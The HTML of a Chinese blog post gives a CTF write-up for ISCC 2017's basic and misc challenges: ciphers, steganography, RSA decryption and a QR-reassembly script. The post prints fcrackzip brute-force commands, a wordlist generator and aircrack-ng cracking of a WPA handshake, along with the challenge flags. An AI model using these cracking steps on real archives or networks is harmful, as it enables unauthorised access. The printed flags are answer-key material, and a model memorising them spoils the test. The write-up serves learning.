@@ -1,0 +1,1313 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|sans-serif:300,300italic,400,400italic,700,700italic|Lato:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Writeup," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="RcoIl的窝" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.png?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="CTF的启蒙ISCC-2017开始了。">
+<meta name="keywords" content="CTF,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC 2017 WriteUp">
+<meta property="og:url" content="http://rcoil.me/2017/05/ISCC-2017/index.html">
+<meta property="og:site_name" content="RcoIl的窝">
+<meta property="og:description" content="CTF的启蒙ISCC-2017开始了。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://i2.muimg.com/567571/4ee9ea052c932688.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/f9e59642a37e8b02.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/015d0169b92591d1.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/2c3186082c18bd9c.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/b9660542167f2ad2.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/927625b246960ad8.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/cbe72cc9ce8522db.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/4860d83267816a54.png">
+<meta property="og:image" content="http://i1.piimg.com/588926/e2c50e47d93f2b68.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/68003f9ea9f65796.png">
+<meta property="og:image" content="http://i1.piimg.com/588926/199db5eca97c1130.png">
+<meta property="og:image" content="http://i1.piimg.com/588926/3836f057baed5746.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/ca76d58e460e5ea1.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/8c8bc136ecf7c907.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/783011093179c497.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/013f3d84f7b4cf2a.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/a42f21c7b840756e.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/da54c4c7d9dd52cd.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/9b0f465230134eea.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/d6e03816e21e01e1.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/08/590ff6edd762f.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/08/590ff6edc2b04.png">
+<meta property="og:image" content="http://i2.muimg.com/588926/48ccd900e35934fa.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/56dce94288c614e9.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/22/592302f03ce93.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/2a463ee68264b48b.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/039172265d7f00c3.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/05/590c049461a67.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/06/590dd22924538.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/06/590ddee340102.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/06/590ddc3c951c1.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/25dae4b8f0805552.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/dc0a1c3542dcf00d.png">
+<meta property="og:image" content="http://i2.muimg.com/588926/3f67399745e8473d.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/4f6a4265ca4b5960.png">
+<meta property="og:image" content="http://i2.muimg.com/588926/560f104b8814acbf.png">
+<meta property="og:image" content="http://i2.muimg.com/588926/874ae02a1819118f.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/23/5923fb7490f27.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/23/5923fbe3aed18.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/23/592404186ed97.gif">
+<meta property="og:image" content="http://i2.muimg.com/588926/46c9bbc14be5efc5.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/61b6efce329c7cea.png">
+<meta property="og:image" content="http://i2.muimg.com/588926/64b0256dcfee034d.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/11/5914749e14a48.png">
+<meta property="og:image" content="http://i2.muimg.com/588926/8211544b8942b5f2.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/22/5923034d8868e.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/24/59256f995bf41.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/2b7f8eb4d3a0c6ae.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/0381e706044ec96b.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/f190f0a6f17ced41.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/1c916da4ed6c077b.png">
+<meta property="og:image" content="http://i4.buimg.com/588926/aa2c430d08fab294.png">
+<meta property="og:image" content="http://i1.piimg.com/588926/17573547a25189b6.png">
+<meta property="og:image" content="http://i1.piimg.com/588926/375c2016f855a3ad.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/15/59197bc6376dc.png">
+<meta property="og:updated_time" content="2017-08-01T16:06:13.853Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ISCC 2017 WriteUp">
+<meta name="twitter:description" content="CTF的启蒙ISCC-2017开始了。">
+<meta name="twitter:image" content="http://i2.muimg.com/567571/4ee9ea052c932688.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '6230266985318450000',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://rcoil.me/2017/05/ISCC-2017/"/>
+
+
+
+
+
+  <title> ISCC 2017 WriteUp | RcoIl的窝 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ce3d1967864bac5f69f1c1a6042e5577";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">RcoIl的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-count">
+          <a href="/count" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa fa-free-code-camp"></i> <br />
+            
+            阅读榜
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://rcoil.me/2017/05/ISCC-2017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="RcoIl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RcoIl的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                ISCC 2017 WriteUp
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-01T15:08:04+08:00">
+                2017-05-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/05/ISCC-2017/" class="leancloud_visitors" data-flag-title="ISCC 2017 WriteUp">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                <!--
+				<i class="fa fa-eye"></i>
+				-->
+				<i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>CTF的启蒙ISCC-2017开始了。<br><a id="more"></a></p>
+<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="Wheel-Cipher"><a href="#Wheel-Cipher" class="headerlink" title="Wheel Cipher"></a>Wheel Cipher</h3><p><img src="http://i2.muimg.com/567571/4ee9ea052c932688.png" alt=""><br><a href="http://pan.baidu.com/s/1mi8xZV6" target="_blank" rel="external">附件链接</a>： 密码：jgjk</p>
+<p>题目就已经有提示了。是Wheel Cipher加密(轮密码)。<br><img src="http://i1.piimg.com/567571/f9e59642a37e8b02.png" alt=""></p>
+<h3 id="神秘图片"><a href="#神秘图片" class="headerlink" title="神秘图片"></a>神秘图片</h3><p><img src="http://i1.piimg.com/567571/015d0169b92591d1.png" alt=""><br><a href="http://pan.baidu.com/s/1mhNGTYg" target="_blank" rel="external">附件链接</a>： 密码：f7w7<br>图片使用foremost工具分离，得出一张猪圈密码图<br><img src="http://i4.buimg.com/567571/2c3186082c18bd9c.png" alt=""></p>
+<p>最后flag为<code>goodluck</code></p>
+<h3 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h3><p><img src="http://i1.piimg.com/567571/b9660542167f2ad2.png" alt=""><br><a href="http://pan.baidu.com/s/1c6G6Xw" target="_blank" rel="external">附件链接</a>： 密码：4hv2<br>这个题目说是简单的加密，结果出来的都是要解密。<br>先对16进制转成字符串，观察字符串是base64加密的，再解密</p>
+<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">r5yG lp9I BjM tFhB</div><div class="line">T6uh y7iJ QsZ bhM</div></pre></td></tr></table></figure></p>
+<p>参照键盘。<br>flag为：<code>TONGYUAN</code></p>
+<h3 id="你猜猜。。"><a href="#你猜猜。。" class="headerlink" title="你猜猜。。"></a>你猜猜。。</h3><p><img src="http://i2.muimg.com/567571/927625b246960ad8.png" alt=""><br><a href="http://pan.baidu.com/s/1qY6oiGs" target="_blank" rel="external">附件链接</a>： 密码：atys<br>将16进制转字符，发现有pk字样。<br>然后用<code>HxD</code>将这十六进制保存为zip。<br>是一个加密的zip文件，猜123456弱口令得出flag。<br>flag为<code>daczcasdqwdcsdzasd</code></p>
+<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p><img src="http://i4.buimg.com/567571/cbe72cc9ce8522db.png" alt=""><br><a href="http://pan.baidu.com/s/1dF6AA7f" target="_blank" rel="external">附件链接</a>： 密码：06wn<br>扫描二维码提示说路由器密码为flag，二维图片使用foremost工具分离，得出一张图和一个zip。<br>再对zip进行破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fcrackzip -b -c &apos;1&apos; -l 1-10 -u crack_this.zip</div></pre></td></tr></table></figure></p>
+<p>密码为<code>20161114</code>,得到一个握手包和<code>破解记录</code>，然后写个脚本生成字典<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a = open(<span class="string">'11.txt'</span>,<span class="string">'w'</span>)</div><div class="line">c=<span class="string">"QWERTYUIOPASDFGHJKLZXcVBNM1234567890"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</div><div class="line">	<span class="keyword">for</span> ii <span class="keyword">in</span> c:</div><div class="line">		<span class="keyword">for</span> iii <span class="keyword">in</span> c:</div><div class="line">			<span class="keyword">for</span> iiii <span class="keyword">in</span> c:</div><div class="line">				cc=<span class="string">'ISCC'</span>+i+ii+iii+iiii</div><div class="line">				a.write(cc+<span class="string">'\n'</span>)</div></pre></td></tr></table></figure></p>
+<p>既然是握手包，又是路由，那还是破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng -w zidian.txt freedom-*.cap</div></pre></td></tr></table></figure></p>
+<p><img src="http://i1.piimg.com/567571/4860d83267816a54.png" alt=""><br>flag为<code>ISCC16BA</code></p>
+<h3 id="说我作弊，需要证据"><a href="#说我作弊，需要证据" class="headerlink" title="说我作弊，需要证据"></a>说我作弊，需要证据</h3><p><img src="http://i1.piimg.com/588926/e2c50e47d93f2b68.png" alt=""><br><a href="http://pan.baidu.com/s/1bpb6Rvx" target="_blank" rel="external">附件链接</a>： 密码：gey4<br>这道题有原题：<a href="https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Creative%20Cheating%20%5Bcrypto%5D%20(150" target="_blank" rel="external">Creative Cheating [crypto] (150)</a>)</p>
+<h3 id="公邮密码"><a href="#公邮密码" class="headerlink" title="公邮密码"></a>公邮密码</h3><p><img src="http://i4.buimg.com/588926/68003f9ea9f65796.png" alt=""><br><a href="http://pan.baidu.com/s/1i5ig8bb" target="_blank" rel="external">附件链接</a>： 密码：beaj<br>除了爆破还是爆破。<br><code>fcrackzip -b -c &#39;A&#39; -l 1-3 -u crack_this.zip</code><br>密码为<code>BIT</code>。<br>TXT里面为<code>RmxhZzp7THkzMTkuaTVkMWYqaUN1bHQhfQ==</code><br><code>Flag:{Ly319.i5d1f*iCult!}</code></p>
+<h3 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h3><p><img src="http://i1.piimg.com/588926/199db5eca97c1130.png" alt=""><br><a href="http://pan.baidu.com/s/1o7InVvW" target="_blank" rel="external">附件链接</a>： 密码：6aa4<br>附件是一个加密脚本，那改一下就行了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $key = md5(<span class="string">'ISCC'</span>);</div><div class="line">    $data = base64_decode(<span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>);</div><div class="line"></div><div class="line">    $len = strlen($data);</div><div class="line">    $klen = strlen($key);</div><div class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </div><div class="line">        <span class="keyword">if</span> ($x == $klen)</div><div class="line">        &#123;</div><div class="line">            $x = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        $char .= $key[$x];</div><div class="line">        $x+=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</div><div class="line">        $tmp  = ord($data[$i]) - ord($char[$i]) + <span class="number">128</span>;</div><div class="line">        $str .= chr($tmp &gt; <span class="number">128</span> ? $tmp<span class="number">-128</span>:$tmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> $str;</div><div class="line"></div><div class="line">&#125;</div><div class="line">decrypt();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>或者用python都没有问题的。<br><img src="http://i1.piimg.com/588926/3836f057baed5746.png" alt=""><br>flag为<code>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</code></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h3><p><img src="http://i4.buimg.com/567571/ca76d58e460e5ea1.png" alt=""><br><a href="http://pan.baidu.com/s/1nvmbxsX" target="_blank" rel="external">附件链接</a>： 密码：4alx<br>打开发现是个docx文档。既然是Misc题，那隐写跑不掉了，而且去年的那到<code>毕业论文</code>也是这样。<br>但是这道题，在点开<code>document.xml</code>就见到flag。<br><img src="http://i1.piimg.com/567571/8c8bc136ecf7c907.png" alt=""><br>flag为<code>flag{F1@g}</code></p>
+<h3 id="就在其中"><a href="#就在其中" class="headerlink" title="就在其中"></a>就在其中</h3><p><img src="http://i1.piimg.com/567571/783011093179c497.png" alt=""><br><a href="http://pan.baidu.com/s/1dFMP1iL" target="_blank" rel="external">附件链接</a>： 密码：nsue<br>是一个流量包,丢到wireshark对流量包进行分析，发先是有FTP协议，那就转用NetworkMiner。</p>
+<p>把四个文件提取出来，有RSA的公钥和私钥，还有个key.zip。<br><img src="http://i4.buimg.com/567571/013f3d84f7b4cf2a.png" alt=""></p>
+<p>用私钥解就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl rsautl -decrypt -in key.txt -inkey test.key -out 1.txt</div></pre></td></tr></table></figure></p>
+<p>flag为<code>haPPy_Use_0penSsI</code><br><img src="http://i1.piimg.com/567571/a42f21c7b840756e.png" alt=""></p>
+<h3 id="很普通的Disco"><a href="#很普通的Disco" class="headerlink" title="很普通的Disco"></a>很普通的Disco</h3><p><img src="http://i4.buimg.com/567571/da54c4c7d9dd52cd.png" alt=""><br><a href="http://pan.baidu.com/s/1i5mj7wD" target="_blank" rel="external">附件链接</a>： 密码：1w2d</p>
+<p>大大音频，用Audacity打开。<br>纵观全局没有那个地方是可疑的，那就再放大。</p>
+<p>在最前面的发现了、<br><img src="http://i4.buimg.com/567571/9b0f465230134eea.png" alt=""><br>高为1低为0。<br>总共105个，分成15组每组7个。<br><code>flag{W0W*funny}</code></p>
+<h3 id="很普通的数独"><a href="#很普通的数独" class="headerlink" title="很普通的数独"></a>很普通的数独</h3><p><img src="http://i1.piimg.com/567571/d6e03816e21e01e1.png" alt=""><br>附件：<a href="http://pan.baidu.com/s/1qYHd9FY" target="_blank" rel="external">链接</a> 密码：el7r<br>以数独混淆，其实是将这25张图组成<code>5*5</code>的二维码。<br><img src="https://ooo.0o0.ooo/2017/05/08/590ff6edd762f.png" alt="QQ图片20170508101652.png"><br>先把这三张图互换位置。<br>补脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python3</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pytesseract</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qr_list</span><span class="params">()</span>:</span></div><div class="line">    </div><div class="line">    qr_list = list()</div><div class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">        qr_list.append(list())</div><div class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">            qr_list[a].append(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">            fname = <span class="string">'%s.png'</span> % (e * <span class="number">5</span> + f + <span class="number">1</span>) </div><div class="line">            </div><div class="line">            img = Image.open(fname).convert(<span class="string">'L'</span>)</div><div class="line"></div><div class="line">            sx, sy, ex, ey, tx = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span></div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">                ty = <span class="number">2</span></div><div class="line">                tx += <span class="number">1</span></div><div class="line">                sx = x * <span class="number">22</span> + tx + <span class="number">1</span> </div><div class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">                    ty += <span class="number">1</span></div><div class="line">                    sy = y * <span class="number">21</span> + ty + <span class="number">1</span> </div><div class="line">                    ex, ey = sx + <span class="number">20</span>, sy + <span class="number">19</span></div><div class="line">                                    </div><div class="line">                    img_temp = img.crop((sx, sy, ex, ey))</div><div class="line">                    </div><div class="line">                    code = pytesseract.image_to_string(img_temp, config=<span class="string">"-psm 5"</span>)</div><div class="line">                    </div><div class="line">                    <span class="keyword">if</span> code!=<span class="string">''</span>:</div><div class="line">                        qr_list[f * <span class="number">9</span> + x][e * <span class="number">9</span> + y] = <span class="number">1</span> </div><div class="line">                    </div><div class="line">                    print(qr_list[f * <span class="number">9</span> + x][e * <span class="number">9</span> + y], (x, y), (sx, sy, ex, ey), (e, f, x, y))</div><div class="line">                    </div><div class="line">    <span class="keyword">return</span> qr_list</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qr_image</span><span class="params">(qr_list)</span>:</span></div><div class="line">    img = Image.new(<span class="string">'L'</span>, (<span class="number">10</span> * <span class="number">47</span>, <span class="number">10</span> * <span class="number">47</span>), (<span class="number">255</span>))</div><div class="line">    draw = ImageDraw.Draw(img)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">            <span class="keyword">if</span> qr_list[f][e]: </div><div class="line">                draw.rectangle(((e + <span class="number">1</span>) * <span class="number">10</span>, (f + <span class="number">1</span>) * <span class="number">10</span>, (e + <span class="number">2</span>) * <span class="number">10</span>, (f + <span class="number">2</span>) * <span class="number">10</span> ), fill=(<span class="number">0</span>))</div><div class="line">                </div><div class="line">            print(qr_list[f][e], <span class="string">' '</span>, end=<span class="string">''</span>)</div><div class="line">        print()</div><div class="line">        </div><div class="line">    img.save(<span class="string">'flag.png'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    get_qr_image(get_qr_list())</div></pre></td></tr></table></figure></p>
+<p><img src="https://ooo.0o0.ooo/2017/05/08/590ff6edc2b04.png" alt="flag.png"><br>扫描得出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9</div></pre></td></tr></table></figure></p>
+<p>flag为：<code>flag{y0ud1any1s1}</code></p>
